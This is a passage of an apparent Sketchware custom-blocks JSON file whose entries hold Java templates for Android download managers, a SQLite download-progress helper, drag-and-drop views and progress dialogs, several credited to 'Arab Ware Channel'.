String ETAG \u003d \"etag\";\n    static final String DIR_PATH \u003d \"dir_path\";\n    static final String FILE_NAME \u003d \"file_name\";\n    static final String TOTAL_BYTES \u003d \"total_bytes\";\n    static final String DOWNLOADED_BYTES \u003d \"downloaded_bytes\";\n    static final String LAST_MODIFIED_AT \u003d \"last_modified_at\";\n    private int id;\n    private String url;\n    private String eTag;\n    private String dirPath;\n    private String fileName;\n    private long totalBytes;\n    private long downloadedBytes;\n    private long lastModifiedAt;\n    public int getId() {\n\t        return id;\n\t    }\n    public void setId(int id) {\n\t        this.id \u003d id;\n\t    }\n    public String getUrl() {\n\t        return url;\n\t    }\n    public void setUrl(String url) {\n\t        this.url \u003d url;\n\t    }\n    public String getETag() {\n\t        return eTag;\n\t    }\n    public void setETag(String eTag) {\n\t        this.eTag \u003d eTag;\n\t    }\n    public String getDirPath() {\n\t        return dirPath;\n\t    }\n    public void setDirPath(String dirPath) {\n\t        this.dirPath \u003d dirPath;\n\t    }\n    public String getFileName() {\n\t        return fileName;\n\t    }\n    public void setFileName(String fileName) {\n\t        this.fileName \u003d fileName;\n\t    }\n    public long getTotalBytes() {\n\t        return totalBytes;\n\t    }\n    public void setTotalBytes(long totalBytes) {\n\t        this.totalBytes \u003d totalBytes;\n\t    }\n    public long getDownloadedBytes() {\n\t        return downloadedBytes;\n\t    }\n    public void setDownloadedBytes(long downloadedBytes) {\n\t        this.downloadedBytes \u003d downloadedBytes;\n\t    }\n    public long getLastModifiedAt() {\n\t        return lastModifiedAt;\n\t    }\n    public void setLastModifiedAt(long lastModifiedAt) {\n\t        this.lastModifiedAt \u003d lastModifiedAt;\n\t    }\n}\n\n\n\npublic static class AppDbHelper implements DbHelper {\n\n    public static final String TABLE_NAME \u003d \"prdownloader\";\n    private final android.database.sqlite.SQLiteDatabase db;\n    public AppDbHelper(Context context) {\n\t        DatabaseOpenHelper databaseOpenHelper \u003d new DatabaseOpenHelper(context);\n\t        db \u003d databaseOpenHelper.getWritableDatabase();\n\t    }\n    @Override\n    public DownloadModel find(int id) {\n\t        android.database.Cursor cursor \u003d null;\n\t        DownloadModel model \u003d null;\n\t        try {\n\t\t            cursor \u003d db.rawQuery(\"SELECT * FROM \" + TABLE_NAME + \" WHERE \" +\n\t\t                    DownloadModel.ID + \" \u003d \" + id, null);\n\t\t            if (cursor !\u003d null \u0026\u0026 cursor.moveToFirst()) {\n\t\t\t                model \u003d new DownloadModel();\n\t\t\t                model.setId(id);\n\t\t\t                model.setUrl(cursor.getString(cursor.getColumnIndex(DownloadModel.URL)));\n\t\t\t                model.setETag(cursor.getString(cursor.getColumnIndex(DownloadModel.ETAG)));\n\t\t\t                model.setDirPath(cursor.getString(cursor.getColumnIndex(DownloadModel.DIR_PATH)));\n\t\t\t                model.setFileName(cursor.getString(cursor.getColumnIndex(DownloadModel.FILE_NAME)));\n\t\t\t                model.setTotalBytes(cursor.getLong(cursor.getColumnIndex(DownloadModel.TOTAL_BYTES)));\n\t\t\t                model.setDownloadedBytes(cursor.getLong(cursor.getColumnIndex(DownloadModel.DOWNLOADED_BYTES)));\n\t\t\t                model.setLastModifiedAt(cursor.getLong(cursor.getColumnIndex(DownloadModel.LAST_MODIFIED_AT)));\n\t\t\t            }\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        } finally {\n\t\t            if (cursor !\u003d null) {\n\t\t\t                cursor.close();\n\t\t\t            }\n\t\t        }\n\t        return model;\n\t    }\n    @Override\n    public void insert(DownloadModel model) {\n\t        try {\n\t\t            ContentValues values \u003d new ContentValues();\n\t\t            values.put(DownloadModel.ID, model.getId());\n\t\t            values.put(DownloadModel.URL, model.getUrl());\n\t\t            values.put(DownloadModel.ETAG, model.getETag());\n\t\t            values.put(DownloadModel.DIR_PATH, model.getDirPath());\n\t\t            values.put(DownloadModel.FILE_NAME, model.getFileName());\n\t\t            values.put(DownloadModel.TOTAL_BYTES, model.getTotalBytes());\n\t\t            values.put(DownloadModel.DOWNLOADED_BYTES, model.getDownloadedBytes());\n\t\t            values.put(DownloadModel.LAST_MODIFIED_AT, model.getLastModifiedAt());\n\t\t            db.insert(TABLE_NAME, null, values);\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        }\n\t    }\n    @Override\n    public void update(DownloadModel model) {\n\t        try {\n\t\t            ContentValues values \u003d new ContentValues();\n\t\t            values.put(DownloadModel.URL, model.getUrl());\n\t\t            values.put(DownloadModel.ETAG, model.getETag());\n\t\t            values.put(DownloadModel.DIR_PATH, model.getDirPath());\n\t\t            values.put(DownloadModel.FILE_NAME, model.getFileName());\n\t\t            values.put(DownloadModel.TOTAL_BYTES, model.getTotalBytes());\n\t\t            values.put(DownloadModel.DOWNLOADED_BYTES, model.getDownloadedBytes());\n\t\t            values.put(DownloadModel.LAST_MODIFIED_AT, model.getLastModifiedAt());\n\t\t            db.update(TABLE_NAME, values, DownloadModel.ID + \" \u003d ? \",\n\t\t                    new String[]{String.valueOf(model.getId())});\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        }\n\t    }\n    @Override\n    public void updateProgress(int id, long downloadedBytes, long lastModifiedAt) {\n\t        try {\n\t\t            ContentValues values \u003d new ContentValues();\n\t\t            values.put(DownloadModel.DOWNLOADED_BYTES, downloadedBytes);\n\t\t            values.put(DownloadModel.LAST_MODIFIED_AT, lastModifiedAt);\n\t\t            db.update(TABLE_NAME, values, DownloadModel.ID + \" \u003d ? \",\n\t\t                    new String[]{String.valueOf(id)});\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        }\n\t    }\n    @Override\n    public void remove(int id) {\n\t        try {\n\t\t            db.execSQL(\"DELETE FROM \" + TABLE_NAME + \" WHERE \" +\n\t\t                    DownloadModel.ID + \" \u003d \" + id);\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        }\n\t    }\n    @Override\n    public List\u003cDownloadModel\u003e getUnwantedModels(int days) {\n\t        List\u003cDownloadModel\u003e models \u003d new ArrayList\u003c\u003e();\n\t        android.database.Cursor cursor \u003d null;\n\t        try {\n\t\t            final long daysInMillis \u003d days * 24 * 60 * 60 * 1000L;\n\t\t            final long beforeTimeInMillis \u003d System.currentTimeMillis() - daysInMillis;\n\t\t            cursor \u003d db.rawQuery(\"SELECT * FROM \" + TABLE_NAME + \" WHERE \" +\n\t\t                    DownloadModel.LAST_MODIFIED_AT + \" \u003c\u003d \" + beforeTimeInMillis, null);\n\t\t            if (cursor !\u003d null \u0026\u0026 cursor.moveToFirst()) {\n\t\t\t                do {\n\t\t\t\t                    DownloadModel model \u003d new DownloadModel();\n\t\t\t\t                    model.setId(cursor.getInt(cursor.getColumnIndex(DownloadModel.ID)));\n\t\t\t\t                    model.setUrl(cursor.getString(cursor.getColumnIndex(DownloadModel.URL)));\n\t\t\t\t                    model.setETag(cursor.getString(cursor.getColumnIndex(DownloadModel.ETAG)));\n\t\t\t\t                    model.setDirPath(cursor.getString(cursor.getColumnIndex(DownloadModel.DIR_PATH)));\n\t\t\t\t                    model.setFileName(cursor.getString(cursor.getColumnIndex(DownloadModel.FILE_NAME)));\n\t\t\t\t                    model.setTotalBytes(cursor.getLong(cursor.getColumnIndex(DownloadModel.TOTAL_BYTES)));\n\t\t\t\t                    model.setDownloadedBytes(cursor.getLong(cursor.getColumnIndex(DownloadModel.DOWNLOADED_BYTES)));\n\t\t\t\t                    model.setLastModifiedAt(cursor.getLong(cursor.getColumnIndex(DownloadModel.LAST_MODIFIED_AT)));\n\t\t\t\t                    models.add(model);\n\t\t\t\t                } while (cursor.moveToNext());\n\t\t\t            }\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        } finally {\n\t\t            if (cursor !\u003d null) {\n\t\t\t                cursor.close();\n\t\t\t            }\n\t\t        }\n\t        return models;\n\t    }\n    @Override\n    public void clear() {\n\t        try {\n\t\t            db.delete(TABLE_NAME, null, null);\n\t\t        } catch (Exception e) {\n\t\t            e.printStackTrace();\n\t\t        }\n\t    }\n}\n\npublic static class DatabaseOpenHelper extends android.database.sqlite.SQLiteOpenHelper {\n    private static final String DATABASE_NAME \u003d \"prdownloader.db\";\n    private static final int DATABASE_VERSION \u003d 1;\n    DatabaseOpenHelper(Context context) {\n\t        super(context, DATABASE_NAME, null, DATABASE_VERSION);\n\t    }\n    @Override\n    public void onCreate(android.database.sqlite.SQLiteDatabase db) {\n\t        db.execSQL(\"CREATE TABLE IF NOT EXISTS \" +\n\t                AppDbHelper.TABLE_NAME + \"( \" +\n\t                DownloadModel.ID + \" INTEGER PRIMARY KEY, \" +\n\t                DownloadModel.URL + \" VARCHAR, \" +\n\t                DownloadModel.ETAG + \" VARCHAR, \" +\n\t                DownloadModel.DIR_PATH + \" VARCHAR, \" +\n\t                DownloadModel.FILE_NAME + \" VARCHAR, \" +\n\t                DownloadModel.TOTAL_BYTES + \" INTEGER, \" +\n\t                DownloadModel.DOWNLOADED_BYTES + \" INTEGER, \" +\n\t                DownloadModel.LAST_MODIFIED_AT + \" INTEGER \" +\n\t                \")\");\n\t    }\n    @Override\n    public void onUpgrade(android.database.sqlite.SQLiteDatabase db, int i, int i1) {\n\t    }\n}\n\npublic static interface DbHelper {\n    DownloadModel find(int id);\n    void insert(DownloadModel model);\n    void update(DownloadModel model);\n    void updateProgress(int id, long downloadedBytes, long lastModifiedAt);\n    void remove(int id);\n    List\u003cDownloadModel\u003e getUnwantedModels(int days);\n    void clear();\n}\n\n\npublic static class NoOpsDbHelper implements DbHelper {\n    public NoOpsDbHelper() {\n\t    }\n    @Override\n    public DownloadModel find(int id) {\n\t        return null;\n\t    }\n    @Override\n    public void insert(DownloadModel model) {\n\t    }\n    @Override\n    public void update(DownloadModel model) {\n\t    }\n    @Override\n    public void updateProgress(int id, long downloadedBytes, long lastModifiedAt) {\n\t    }\n    @Override\n    public void remove(int id) {\n\t    }\n    @Override\n    public List\u003cDownloadModel\u003e getUnwantedModels(int days) {\n\t        return null;\n\t    }\n    @Override\n    public void clear() {\n\t    }\n}\n\npublic static class DownloadFutureTask extends java.util.concurrent.FutureTask\u003cDownloadRunnable\u003e implements Comparable\u003cDownloadFutureTask\u003e {\n    private final DownloadRunnable runnable;\n    DownloadFutureTask(DownloadRunnable downloadRunnable) {\n\t        super(downloadRunnable, null);\n\t        this.runnable \u003d downloadRunnable;\n\t    }\n    @Override\n    public int compareTo(DownloadFutureTask other) {\n\t        Priority p1 \u003d runnable.priority;\n\t        Priority p2 \u003d other.runnable.priority;\n\t        return (p1 \u003d\u003d p2 ? runnable.sequence - other.runnable.sequence : p2.ordinal() - p1.ordinal());\n\t    }\n}\n\npublic static class DownloadExecutor extends java.util.concurrent.ThreadPoolExecutor {\n    DownloadExecutor(int maxNumThreads, java.util.concurrent.ThreadFactory threadFactory) {\n\t        super(maxNumThreads, maxNumThreads, 0, java.util.concurrent.TimeUnit.MILLISECONDS,\n\t                new java.util.concurrent.PriorityBlockingQueue\u003cRunnable\u003e(), threadFactory);\n\t    }\n    @Override\n    public java.util.concurrent.Future\u003c?\u003e submit(Runnable task) {\n\t        DownloadFutureTask futureTask \u003d new DownloadFutureTask((DownloadRunnable) task);\n\t        execute(futureTask);\n\t        return futureTask;\n\t    }\n}\n{","color":"#FF33691E","name":"PUT ME IN MORE BLOCK","typeName":"","palette":"167","type":" ","spec":"put me on more block"},{"code":"}\nprivate int downloadId;\nprivate static String dirPath;\npublic static final class Utilss {\n    private Utilss() {\n    }\n    public static String getRootDirPath(Context context) {\n        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {\n           // java.io.File file \u003d context.getExternalFilesDirs(context.getApplicationContext(), null)[0];\n           // return file.getAbsolutePath();\n            return context.getApplicationContext().getFilesDir().getAbsolutePath();\n        } else {\n            return context.getApplicationContext().getFilesDir().getAbsolutePath();\n        }\n    }\n    public static String getProgressDisplayLine(long currentBytes, long totalBytes) {\n        return getBytesToMBString(currentBytes) + \"/\" + getBytesToMBString(totalBytes);\n    }\n    private static String getBytesToMBString(long bytes){\n        return String.format(Locale.ENGLISH, \"\", bytes / (1024.00 * 1024.00));\n    }\n}\n{","color":"#FF33691E","name":"put me in more block 2","typeName":"","palette":"167","type":" ","spec":"put me on more block ( another one )"},{"code":"PRDownloader.pause(downloadId);","color":"#FF33691E","name":"pause","typeName":"","palette":"167","type":" ","spec":"pause download"},{"code":"PRDownloader.resume(downloadId);","color":"#FF33691E","name":"resume","typeName":"","palette":"167","type":" ","spec":"resume download"},{"code":"}\npublic ir.siaray.downloadmanagerplus.classes.Downloader %1$sD;\npublic int %1$sN1,%1$sN2,%1$sN3;\n{","color":"#FF2962FF","name":"more block.....","typeName":"","palette":"167","type":" ","spec":"%m.intent put me at more block |ضعني في مور بلوك"},{"code":"\n%1$sD \u003d ir.siaray.downloadmanagerplus.classes.Downloader.getInstance(getApplicationContext())\n .setUrl(%2$s)\n .setListener(new ir.siaray.downloadmanagerplus.interfaces.DownloadListener() {\n            @Override\n            public void onComplete(int totalBytes) {\n               %9$s\n            }\n            \n            @Override\n            public void onRunning(int percent, int totalBytes, int downloadedBytes, float downloadSpeed) {\n%1$sN1 \u003d totalBytes;\n%1$sN2 \u003d downloadedBytes;\n%1$sN3 \u003d (int) downloadSpeed;\n%8$s\n            }\n\n@Override\n            public void onPause(int percent, ir.siaray.downloadmanagerplus.enums.DownloadReason reason, int totalBytes, int downloadedBytes) {\n               \n            }\n            @Override\n            public void onPending(int percent, int totalBytes, int downloadedBytes) {\n                \n            }\n            @Override\n            public void onFail(int percent, ir.siaray.downloadmanagerplus.enums.DownloadReason reason, int totalBytes, int downloadedBytes) {\n                 \n            }\n            @Override\n            public void onCancel(int totalBytes, int downloadedBytes) {\n                \n            }\n\n        })\n .setToken(%2$s)\n .setAllowedOverRoaming(true)\n .setAllowedOverMetered(true) //Api 16 and higher\n .setVisibleInDownloadsUi(true)\n .setDestinationDir(%3$s, %4$s)\n .setNotificationTitle(%5$s)\n .setDescription(%6$s);\nif(!%7$s) {\n%1$sD.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);\n}","color":"#FF2962FF","typeName":"","name":"new Downloader","palette":"167","type":"e","spec":"%m.intent  set url %s set save path (without storage main path ) %s set file name %s set notification title %s set notification description %s set notification shown %b OnDownloadRun","spec2":"OnDownloadCompleted"},{"code":"","color":"#FF2962FF","name":"for android 11","typeName":"","palette":"167","type":"h","spec":"for android 11 لاندرويد اصدار احد عشر"},{"code":"\n%1$sD \u003d ir.siaray.downloadmanagerplus.classes.Downloader.getInstance(getApplicationContext())\n .setUrl(%2$s)\n .setListener(new ir.siaray.downloadmanagerplus.interfaces.DownloadListener() {\n            @Override\n            public void onComplete(int totalBytes) {\n               %9$s\n            }\n            \n            @Override\n            public void onRunning(int percent, int totalBytes, int downloadedBytes, float downloadSpeed) {\n%1$sN1 \u003d totalBytes;\n%1$sN2 \u003d downloadedBytes;\n%1$sN3 \u003d (int) downloadSpeed;\n%8$s\n            }\n\n@Override\n            public void onPause(int percent, ir.siaray.downloadmanagerplus.enums.DownloadReason reason, int totalBytes, int downloadedBytes) {\n               \n            }\n            @Override\n            public void onPending(int percent, int totalBytes, int downloadedBytes) {\n                \n            }\n            @Override\n            public void onFail(int percent, ir.siaray.downloadmanagerplus.enums.DownloadReason reason, int totalBytes, int downloadedBytes) {\n                 \n            }\n            @Override\n            public void onCancel(int totalBytes, int downloadedBytes) {\n                \n            }\n\n        })\n .setToken(%2$s)\n .setAllowedOverRoaming(true)\n .setAllowedOverMetered(true) //Api 16 and higher\n .setVisibleInDownloadsUi(true)\n .setDestinationDir(Environment.DIRECTORY_DOWNLOADS, %4$s)\n .setNotificationTitle(%5$s)\n .setDescription(%6$s);\nif(!%7$s) {\n%1$sD.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);\n}","color":"#FF2962FF","typeName":"","name":"new Downloader_copy58","palette":"167","type":"e","spec":"%m.intent  set url %s set save path (without storage main path ) %s set file name %s set notification title %s set notification description %s set notification shown %b OnDownloadRun","spec2":"OnDownloadCompleted"},{"code":"%1$sD.start();","color":"#FF2962FF","name":"start ....","typeName":"","palette":"167","type":" ","spec":"%m.intent start"},{"code":"%1$sD.pause();","color":"#FF2962FF","name":"pause....","typeName":"","palette":"167","type":" ","spec":"%m.intent pause"},{"code":"%1$sD.resume();","color":"#FF2962FF","name":"resume ....","typeName":"","palette":"167","type":" ","spec":"%m.intent resume"},{"code":"%1$sN1","color":"#FF2962FF","name":"getTotalBytes","typeName":"","palette":"167","type":"d","spec":"%m.intent get total bytes"},{"code":"%1$sN2","color":"#FF2962FF","name":"getCurrentBytes","typeName":"","palette":"167","type":"d","spec":"%m.intent get current bytes"},{"code":"%1$sN3","color":"#FF2962FF","name":"get download speed","typeName":"","palette":"167","type":"d","spec":"%m.intent get download speed"},{"code":"}public static class Dragger {\n    private View dragView;\n    private View[] targetViews;\n    private float dX, dY;\n    private int initXY[] \u003d new int[2];\n    private boolean isInitXy \u003d false;\n    private boolean eventSuccess \u003d false;\n    private DragEventListener dragEventListener;\n    private View view;\n    public Dragger(View dragView, View[] targetViews) {\n        this.dragView \u003d dragView;\n        this.targetViews \u003d targetViews;\n    }\n    public Dragger() {\n    }\n    public static Dragger create(){\n        return new Dragger();\n    }\n    public Dragger setDragView(View dragView) {\n        this.dragView \u003d dragView;\n        return this;\n    }\n    public Dragger setTargetViews(View[] targetViews) {\n        this.targetViews \u003d targetViews;\n        return this;\n    }\n    public Dragger setDragEventListener(DragEventListener dragEventListener) {\n        this.dragEventListener \u003d dragEventListener;\n        return this;\n    }\n    public void startDragging(){\n        if(dragView \u003d\u003d null){\n            return;\n        }\n        if(targetViews \u003d\u003d null){\n            return;\n        }\n        dragView.setOnTouchListener(new View.OnTouchListener() {\n            @Override\n            public boolean onTouch(View v, MotionEvent event) {\n                switch (event.getAction()) {\n                    case MotionEvent.ACTION_DOWN:\n                        dX \u003d dragView.getX() - event.getRawX();\n                        dY \u003d dragView.getY() - event.getRawY();\n                        if(!isInitXy) {\n                            dragView.getLocationInWindow(initXY);\n                            isInitXy \u003d true;\n                        }\n                        break;\n                    case MotionEvent.ACTION_MOVE:\n                        dragView.animate()\n                                .x(event.getRawX() + dX)\n                                .y(event.getRawY() + dY)\n                                .setDuration(0)\n                                .start();\n                        for(int i\u003d0;i\u003ctargetViews.length;i++) {\n                            if (isViewInBounds(targetViews[i], event.getRawX(), event.getRawY())) {\n                                Dragger.this.view \u003d targetViews[i];\n                                eventSuccess \u003d true;\n                                break;\n                            }\n                            else {\n                                eventSuccess \u003d false;\n                            }\n                        }\n                        break;\n                    case MotionEvent.ACTION_UP:\n                        if(!eventSuccess) {\n                            dragView.animate()\n                                    .x(initXY[0])\n                                    .y(initXY[1])\n                                    .setDuration(0)\n                                    .start();\n                        }else {\n                            if(dragEventListener !\u003d null)\n                                dragEventListener.onDragComplete(view);\n                        }\n                    default:\n                        return false;\n                }\n                return true;\n            }\n        });\n    }\n    private Rect rect \u003d new Rect();\n    private int[] location \u003d new int[2];\n    private boolean isViewInBounds(View target, float x, float y){\n        target.getDrawingRect(rect);\n        target.getLocationOnScreen(location);\n        rect.offset(location[0], location[1]);\n        return rect.contains((int) x, (int)y);\n    }\n    public interface DragEventListener{\n        public void onDragComplete(View targetView);\n    }\n","color":"#CAC319","name":"DraggerLibrary","typeName":"","palette":"168","type":" ","spec":"\u003e\u003e\u003e\u003e DraggerLibrary \u003c\u003c\u003c\u003c"},{"code":"Dragger.create().setDragView(%s)\n\t.setTargetViews(new View[]{%s})\n\t.setDragEventListener(new Dragger.DragEventListener() {\n\t@Override\n\tpublic void onDragComplete(View targetView) {\n%s\n\t}\n}).startDragging();","color":"#CAC319","name":"setDragView","typeName":"","palette":"168","type":"c","spec":"setDragView %m.view and setTargetViews%m.view  When onDragComplete"},{"code":"%s,%s","color":"#CAC319","name":"ViewAndView","typeName":"view","palette":"168","type":"p","spec":"%m.view and %m.view"},{"code":"targetView.equals(%s)","color":"#CAC319","name":"viewIsTargetView","typeName":"","palette":"168","type":"b","spec":"%m.view isTargetView"},{"code":"","color":"#FF1E88E5","name":"created by arab ware channel ! the library from github","typeName":"","palette":"169","type":"h","spec":"created by arab ware channel owner from found github library"},{"code":"final CircleProgressView %1$sV \u003d (CircleProgressView)findViewById(R.id.%1$s);","color":"#FF1E88E5","name":"progress","typeName":"","palette":"169","type":" ","spec":"put circle progress view into %m.progressbar"},{"code":"final int %1$svar \u003d (int) %2$s;\nfinal float %1$svar2 \u003d (float) (%1$svar);\n%1$sV.setStartProgress(%1$svar2);","color":"#FF1E88E5","name":"set progress","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set progress with number variable %d"},{"code":"%1$sV.setStartProgress(%1$svar2);","color":"#FF1E88E5","name":"set progress_copy18","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set progress without number variable %d"},{"code":"%1$sV.setEndProgress(%1$svar2);","color":"#FF1E88E5","name":"set max","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set max progress %d"},{"code":"%1$sV.setStartColor(Color.parseColor(%2$s));","color":"#FF1E88E5","name":"set start color","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set start color %s"},{"code":"%1$sV.setEndColor(Color.parseColor(%2$s));","color":"#FF1E88E5","name":"set end color","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set end color %s"},{"code":"%1$sV.setCircleBroken(%2$s);","color":"#FF1E88E5","name":"set circle broken","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set broken mode %b"},{"code":"%1$s.setTrackWidth(%2$s);","color":"#FF1E88E5","name":"track width","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set track width %d"},{"code":"%1$sV.setProgressDuration(%2$s);","color":"#FF1E88E5","name":"set progress duration","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set progress duration %d"},{"code":"%1$sV.setTrackEnabled(%2$s);","color":"#FF1E88E5","name":"track enable","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set track enable %b"},{"code":"%1$sV.setFillEnabled(%2$s);","color":"#FF1E88E5","name":"fill enable","typeName":"","palette":"169","type":" ","spec":"%m.progressbar set fill enable %b"},{"code":"%1$sV.startProgressAnimation();","color":"#FF1E88E5","name":"start animation","typeName":"","palette":"169","type":" ","spec":"%m.progressbar start animation"},{"code":"","color":"#FF00BCD4","name":"Arab Ware Progress Dailog","typeName":"","palette":"169","type":"h","spec":"Added by Arab Ware Channel"},{"code":"%s \u003d new ProgressDialog(%s.this);","color":"#FF00BCD4","name":"ProgressDialog create","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog Create in %m.activity"},{"code":"%1$s.setTitle(%2$s);","color":"#FF00BCD4","name":"progress dialog title","typeName":"","palette":"169","type":" ","spec":"%m.progressdialog set title %s"},{"code":"%s.setMessage(%s);","color":"#FF00BCD4","name":"ProgressDialog setMessage","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog set Message %s"},{"code":"%s.setIndeterminate((int)%s);","color":"#FF00BCD4","name":"ProgressDialog setIndeterminate","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog set Indeterminate %b"},{"code":"%s.setCancelable(%s);","color":"#FF00BCD4","name":"ProgressDialog setCancelable","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog set Cancelable %b"},{"code":"%s.setMax((int)%s);","color":"#FF00BCD4","name":"ProgressDialog setMax","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog set Max %d"},{"code":"%s.setProgress((int)%s);","color":"#FF00BCD4","name":"ProgressDialog setProgress","typeName":"","palette":"169","type":" ","spec":"%m.progressdialog set Progress %d"},{"code":"%s.getMax()","color":"#FF00BCD4","name":"ProgressDialog getMax","typeName":"","palette":"169","type":"d","spec":" %m.progressdialog get Max"},{"code":"%s.getProgress()","color":"#FF00BCD4","name":"ProgressDialog getProgress","typeName":"","palette":"169","type":"d","spec":" %m.progressdialog get Progress"},{"code":"%1$s.setProgress((int)%1$s.getProgress() + %2$s);","color":"#FF00BCD4","name":"progress dialog increase","typeName":"","palette":"169","type":" ","spec":"increase %m.progressdialog + %d"},{"code":"%1$s.setMax((int)%1$s.getMax() - %2$s);","color":"#FF00BCD4","name":"decrease progress dialog","typeName":"","palette":"169","type":" ","spec":"decrease %m.progressdialog - %d"},{"code":"%s.isIndeterminate()","color":"#FF00BCD4","name":"ProgressDialog isIndeterminate","typeName":"","palette":"169","type":"b","spec":" %m.progressdialog is Indeterminate"},{"code":"%s.isShowing()","color":"#FF00BCD4","name":"ProgressDialog isShowing","typeName":"","palette":"169","type":"b","spec":" %m.progressdialog is Showing"},{"code":"%s.show();","color":"#FF00BCD4","name":"ProgressDialog show","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog show"},{"code":"%s.dismiss();","color":"#FF00BCD4","name":"ProgressDialog dismiss","typeName":"","palette":"169","type":" ","spec":" %m.progressdialog dismiss"},{"code":"","color":"#FF4DD0E1","name":"Arab Ware Progress Dailog With ID","typeName":"","palette":"169","type":"h","spec":"Added by Arab Ware Channel"},{"code":"%s \u003d new ProgressDialog(%s.this);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 1","typeName":"","palette":"169","type":" ","spec":"Create progress dialog with ID %s.inputOnly in %m.activity"},{"code":"%1$s.setTitle(%2$s);","color":"#FF4DD0E1","name":"Arab Ware Progress Dialog 15","typeName":"","palette":"169","type":" ","spec":"%m.progressdialog set title %s"},{"code":"%s.setMessage(%s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 2","typeName":"","palette":"169","type":" ","spec":" set progress dialog %s.inputOnly Message %s"},{"code":"%s.setIndeterminate((int)%s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 3","typeName":"","palette":"169","type":" ","spec":" set progress dialog with ID %s.inputOnly  set Indeterminate %b"},{"code":"%s.setCancelable(%s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 4","typeName":"","palette":"169","type":" ","spec":"set progress dialog with ID %s.inputOnly Cancelable %b"},{"code":"%s.setMax((int)%s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 5","typeName":"","palette":"169","type":" ","spec":" set progress dialog with ID %s.inputOnly Max %d"},{"code":"%s.setProgress((int)%s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 6","typeName":"","palette":"169","type":" ","spec":" set progress dialog with ID %s.inputOnly Progress %d"},{"code":"%s.getMax()","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 7","typeName":"","palette":"169","type":"d","spec":"get Max of progress dialog with ID %s.inputOnly "},{"code":"%s.getProgress()","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 8","typeName":"","palette":"169","type":"d","spec":"get Progress of progress dialog with ID %s.inputOnly "},{"code":"%1$s.setProgress((int)%1$s.getProgress() + %2$s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 9","typeName":"","palette":"169","type":" ","spec":"increase progressdialog with ID %s.inputOnly + %d"},{"code":"%1$s.setMax((int)%1$s.getMax() - %2$s);","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 10","typeName":"","palette":"169","type":" ","spec":"decrease progressdialog with ID %s.inputOnly  - %d"},{"code":"%s.isIndeterminate()","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 11","typeName":"","palette":"169","type":"b","spec":" progress dialog with ID %s.inputOnly  is Indeterminate"},{"code":"%s.isShowing()","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 12","typeName":"","palette":"169","type":"b","spec":" progress dialog with ID %s.inputOnly  is Showing"},{"code":"%s.show();","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 13","typeName":"","palette":"169","type":" ","spec":"show progress dialog with ID %s.inputOnly "},{"code":"%s.dismiss();","color":"#FF00BCD4","name":"Arab Ware Progress Dialog 14","typeName":"","palette":"169","type":" ","spec":"dismiss progress dialog with ID %s.inputOnly "},{"code":"","color":"#FF43A047","name":"created by arab ware channel","typeName":"","palette":"170","type":"h","spec":"created by arab ware channel"},{"code":"","color":"#FF43A047","name":"Add Source Directly Blocks","typeName":"","palette":"170","type":"h","spec":"Add Source Directly Blocks created By Arab Ware"},{"code":"/*%1$s*/","color":"#FF43A047","name":"comment","typeName":"","palette":"170","type":" ","spec":"comment %s.inputOnly"},{"code":"/*%1$s*/\n/*\n%2$s\n*/","color":"#FF43A047","name":"comment2","typeName":"","palette":"170","type":"c","spec":"comment %s.inputOnly"},{"code":"if (%1$s.equals(\"\")) {\r\n\t%1$s \u003d \"\".concat(\"%2$s\");\r\n}\r\nelse {\r\n\t%1$s \u003d %1$s.concat(\"\\n%2$s\");\r\n}","color":"#FF43A047","name":"copy blocks as text","typeName":"","palette":"170","type":"c","spec":"copy #one\u0026small block as text into %m.varStr"},{"code":"%1$s","color":"#FF43A047","name":"add source directly 1","typeName":"","palette":"170","type":" ","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 2","typeName":"","palette":"170","type":"s","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 3","typeName":"","palette":"170","type":"d","spec":"add source direclty %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 4","typeName":"","palette":"170","type":"b","spec":"add source directly %s.inputOnly "},{"code":"%1$s","color":"#FF43A047","name":"add source directly 5","typeName":"","palette":"170","type":"f","spec":"add source directly %s.inputOnly "},{"code":"%1$s\n%3$s\n%2$s","color":"#FF43A047","name":"add source directly 6","typeName":"","palette":"170","type":"c","spec":"add source directly 1 %s.inputOnly  add source directly 2 %s.inputOnly  put between 1 and 2 this 